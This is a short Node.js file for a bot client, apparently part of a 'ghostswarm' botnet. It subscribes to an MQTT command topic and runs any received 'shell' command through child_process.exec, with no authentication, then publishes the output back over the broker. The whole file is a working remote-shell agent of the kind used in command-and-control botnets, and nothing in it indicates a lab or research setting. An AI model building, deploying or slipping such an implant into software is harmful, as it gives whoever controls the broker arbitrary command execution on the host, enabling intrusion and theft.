const mqtt = require('mqtt');
const { exec } = require('child_process');

const BOT_ID = process.env.BOT_ID || 'bot123';
const MQTT_BROKER = process.env.MQTT_BROKER_URL || 'mqtt://localhost:1883';
console.log(`🤖 [${BOT_ID}] connecting to MQTT broker at ${MQTT_BROKER}`);


const mqttClient = mqtt.connect(MQTT_BROKER);

mqttClient.on('connect', () => {
   console.log(`🤖 [${BOT_ID}] connected to MQTT`);
   const topic = `ghostswarm/${BOT_ID}/command`;
   mqttClient.subscribe(topic, { qos: 1 }, (err) => {
      if (err) {
         console.error(`❌ [${BOT_ID}] failed to subscribe:`, err);
      } else {
         console.log(`📡 [${BOT_ID}] subscribed to ${topic}`);
      }
   });
});

mqttClient.on('message', (topic, message) => {
   try {
      const payload = JSON.parse(message.toString());
      console.log(`📥 [${BOT_ID}] received:`, payload);

      const statusTopic = `ghostswarm/${BOT_ID}/status`;

      // Handle different message types
      if (payload.type === 'shell' && payload.cmd) {
         // Execute shell command
         exec(payload.cmd, (err, stdout, stderr) => {
            mqttClient.publish(statusTopic, JSON.stringify({
               requestId: payload.requestId,
               output: err ? stderr || 'Command failed' : stdout.trim(),
               status: err ? 'error' : 'ok',
               time: Date.now()
            }));
            console.log(`📤 [${BOT_ID}] shell command executed and responded`);
         });
      } else {
         // General echo response for non-shell commands
         mqttClient.publish(statusTopic, JSON.stringify({
            received: payload,
            status: "ok",
            time: Date.now()
         }));
         console.log(`📤 [${BOT_ID}] responded to status`);
      }
   } catch (err) {
      console.error(`❌ [${BOT_ID}] failed to handle message`, err);

      // Send error response
      const statusTopic = `ghostswarm/${BOT_ID}/status`;
      mqttClient.publish(statusTopic, JSON.stringify({
         status: "error",
         error: err.message,
         time: Date.now()
      }));
   }
});
